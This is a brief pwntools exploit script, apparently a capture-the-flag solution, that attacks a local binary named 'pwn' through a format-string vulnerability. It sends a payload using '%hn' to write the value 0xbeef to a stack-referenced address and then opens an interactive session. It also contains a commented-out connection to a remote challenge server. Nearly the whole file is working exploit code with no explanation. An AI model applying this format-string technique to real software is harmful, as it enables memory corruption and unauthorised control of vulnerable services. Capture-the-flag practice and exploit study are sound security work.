#!/usr/bin/python3
from pwn import *
import argparse
import re
context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
e = context.binary = ELF("./pwn",checksec=False)
p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"

+"\nbreak *main+129"
   +"\nc"
)
#p = remote("83.136.254.199",43496)
payload = b"%" + str(int(0xbeef)).encode() +b"x"   
payload += b"%7$hn"
p.sendlineafter('>>',payload)
#input()
p.interactive()